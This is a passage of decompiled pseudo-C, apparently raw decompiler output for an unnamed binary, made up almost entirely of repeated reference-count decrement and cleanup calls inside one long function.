(**(**(ppiStack1944 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                iStack2612 = 0x76c7f0;\n                iStack2608 = 0x40b2f8;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2608 = 0x76c7f0;\n                    fcn.00402c50();\n                    iStack2612 = iVar5;\n                }\n                piVar6 = iStack2252 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2252 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                iStack2624 = 0x76c7f0;\n                iStack2620 = 0x40b358;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2620 = 0x76c7f0;\n                    fcn.00402c50();\n                    iStack2624 = iVar5;\n                }\n                piVar6 = ppiStack2064 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(ppiStack2064 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                iStack2636 = 0x76c7f0;\n                iStack2632 = 0x40b3b8;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2632 = 0x76c7f0;\n                    fcn.00402c50();\n                    iStack2636 = iVar5;\n                }\n                piVar6 = ppiStack2268 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(ppiStack2268 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                iStack2648 = 0x76c7f0;\n                iStack2644 = 0x40b418;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack2644 = 0x76c7f0;\n                    fcn.00402c50();\n                    iStack2648 = iVar5;\n                }\n                piVar6 = iStack1904 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1904 + -0x10) + 4))();\n                }\n                uStack2652 = 0x40b463;\n                fcn.004018d0();\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    fcn.00402c50();\n                }\n                piVar6 = iStack2284 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2284 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    fcn.00402c50();\n                }\n                piVar6 = iStack2104 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2104 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                LOCK();\n                iVar5 = *0x40a91f + -1;\n                iVar7 = *0x40a91f + -1;\n                bVar10 = *0x40a91f == 1;\n                *0x40a91f = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x40a913 + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = ppiStack2016 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(ppiStack2016 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2648 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2648 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = ppiStack2112 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(ppiStack2112 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                LOCK();\n                iVar5 = *0x40b45f + -1;\n                iVar7 = *0x40b45f + -1;\n                bVar10 = *0x40b45f == 1;\n                *0x40b45f = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x40b453 + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                LOCK();\n                iVar5 = *0x40b45f + -1;\n                iVar7 = *0x40b45f + -1;\n                bVar10 = *0x40b45f == 1;\n                *0x40b45f = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x40b453 + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2648 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2648 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2644 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2644 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                LOCK();\n                iVar5 = *0x40b3ff + -1;\n                iVar7 = *0x40b3ff + -1;\n                bVar10 = *0x40b3ff == 1;\n                *0x40b3ff = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x40b3f3 + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2636 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2636 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2632 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2632 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                LOCK();\n                iVar5 = *0x40b39f + -1;\n                iVar7 = *0x40b39f + -1;\n                bVar10 = *0x40b39f == 1;\n                *0x40b39f = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x40b393 + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2624 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2624 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2620 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2620 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                LOCK();\n                iVar5 = *0x40b33f + -1;\n                iVar7 = *0x40b33f + -1;\n                bVar10 = *0x40b33f == 1;\n                *0x40b33f = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x40b333 + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2612 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2612 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2608 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2608 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                LOCK();\n                iVar5 = *0x40b2df + -1;\n                iVar7 = *0x40b2df + -1;\n                bVar10 = *0x40b2df == 1;\n                *0x40b2df = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x40b2d3 + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2600 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2600 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2596 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2596 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                LOCK();\n                iVar5 = *0x40b27f + -1;\n                iVar7 = *0x40b27f + -1;\n                bVar10 = *0x40b27f == 1;\n                *0x40b27f = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x40b273 + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2588 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2588 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2584 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2584 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                LOCK();\n                iVar5 = *0x40b21f + -1;\n                iVar7 = *0x40b21f + -1;\n                bVar10 = *0x40b21f == 1;\n                *0x40b21f = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x40b213 + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2576 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2576 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2572 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2572 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                LOCK();\n                iVar5 = *0x40b1bf + -1;\n                iVar7 = *0x40b1bf + -1;\n                bVar10 = *0x40b1bf == 1;\n                *0x40b1bf = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x40b1b3 + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2564 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2564 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2560 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2560 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                LOCK();\n                iVar5 = *0x40b15f + -1;\n                iVar7 = *0x40b15f + -1;\n                bVar10 = *0x40b15f == 1;\n                *0x40b15f = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x40b153 + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2552 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2552 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2548 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2548 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                LOCK();\n                iVar5 = *0x40b0ff + -1;\n                iVar7 = *0x40b0ff + -1;\n                bVar10 = *0x40b0ff == 1;\n                *0x40b0ff = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x40b0f3 + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2540 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2540 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2536 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2536 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                LOCK();\n                iVar5 = *0x40b09f + -1;\n                iVar7 = *0x40b09f + -1;\n                bVar10 = *0x40b09f == 1;\n                *0x40b09f = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x40b093 + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2528 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2528 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2524 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2524 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                LOCK();\n                iVar5 = *0x40b03f + -1;\n                iVar7 = *0x40b03f + -1;\n                bVar10 = *0x40b03f == 1;\n                *0x40b03f = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x40b033 + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2516 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2516 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2512 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2512 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                LOCK();\n                iVar5 = *0x40afdf + -1;\n                iVar7 = *0x40afdf + -1;\n                bVar10 = *0x40afdf == 1;\n                *0x40afdf = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x40afd3 + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2504 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2504 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2500 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2500 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                LOCK();\n                iVar5 = *0x40af7f + -1;\n                iVar7 = *0x40af7f + -1;\n                bVar10 = *0x40af7f == 1;\n                *0x40af7f = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x40af73 + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2492 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2492 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2488 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2488 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                LOCK();\n                iVar5 = *0x40af1f + -1;\n                iVar7 = *0x40af1f + -1;\n                bVar10 = *0x40af1f == 1;\n                *0x40af1f = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x40af13 + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2480 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2480 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2476 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2476 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                LOCK();\n                iVar5 = *0x40aebf + -1;\n                iVar7 = *0x40aebf + -1;\n                bVar10 = *0x40aebf == 1;\n                *0x40aebf = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x40aeb3 + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2468 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2468 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2464 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2464 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                LOCK();\n                iVar5 = *0x40ae5f + -1;\n                iVar7 = *0x40ae5f + -1;\n                bVar10 = *0x40ae5f == 1;\n                *0x40ae5f = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x40ae53 + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2456 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2456 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2452 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2452 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                LOCK();\n                iVar5 = *0x40adff + -1;\n                iVar7 = *0x40adff + -1;\n                bVar10 = *0x40adff == 1;\n                *0x40adff = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x40adf3 + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2444 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2444 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2440 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2440 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                LOCK();\n                iVar5 = *0x40ad9f + -1;\n                iVar7 = *0x40ad9f + -1;\n                bVar10 = *0x40ad9f == 1;\n                *0x40ad9f = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x40ad93 + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2432 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2432 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2428 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2428 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                LOCK();\n                iVar5 = *0x40ad3f + -1;\n                iVar7 = *0x40ad3f + -1;\n                bVar10 = *0x40ad3f == 1;\n                *0x40ad3f = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x40ad33 + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2420 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2420 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2416 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2416 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                LOCK();\n                iVar5 = *0x40acdf + -1;\n                iVar7 = *0x40acdf + -1;\n                bVar10 = *0x40acdf == 1;\n                *0x40acdf = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x40acd3 + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2408 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2408 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2404 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2404 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                LOCK();\n                iVar5 = *0x40ac7f + -1;\n                iVar7 = *0x40ac7f + -1;\n                bVar10 = *0x40ac7f == 1;\n                *0x40ac7f = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x40ac73 + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2396 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2396 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2392 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2392 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                LOCK();\n                iVar5 = *0x40ac1f + -1;\n                iVar7 = *0x40ac1f + -1;\n                bVar10 = *0x40ac1f == 1;\n                *0x40ac1f = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x40ac13 + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2384 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2384 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2380 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2380 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                LOCK();\n                iVar5 = *0x40abbf + -1;\n                iVar7 = *0x40abbf + -1;\n                bVar10 = *0x40abbf == 1;\n                *0x40abbf = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x40abb3 + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2372 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2372 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2368 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2368 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                LOCK();\n                iVar5 = *0x40ab5f + -1;\n                iVar7 = *0x40ab5f + -1;\n                bVar10 = *0x40ab5f == 1;\n                *0x40ab5f = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x40ab53 + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2360 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2360 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2356 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2356 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                LOCK();\n                iVar5 = *0x40aaff + -1;\n                iVar7 = *0x40aaff + -1;\n                bVar10 = *0x40aaff == 1;\n                *0x40aaff = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x40aaf3 + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2348 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2348 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2344 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2344 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                LOCK();\n                iVar5 = *0x40aa9f + -1;\n                iVar7 = *0x40aa9f + -1;\n                bVar10 = *0x40aa9f == 1;\n                *0x40aa9f = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x40aa93 + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2336 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2336 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                uStack3016 = 0x76c7f0;\n                fcn.00402ed0();\n                piVar6 = iStack2332 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2332 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                uVar2 = 0;\n                fcn.00402ed0();\n                LOCK();\n                iVar5 = *0x40aa3f + -1;\n                iVar7 = *0x40aa3f + -1;\n                bVar10 = *0x40aa3f == 1;\n                *0x40aa3f = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x40aa33 + 4))();\n                }\n                fcn.004018d0();\n                in_stack_fffff430 = 0x76c7f0;\n                fcn.00402ed0();\n                piVar6 = iStack2324 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2324 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2320 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2320 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                LOCK();\n                iVar5 = *0x40a9df + -1;\n                iVar7 = *0x40a9df + -1;\n                bVar10 = *0x40a9df == 1;\n                *0x40a9df = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x40a9d3 + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2312 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                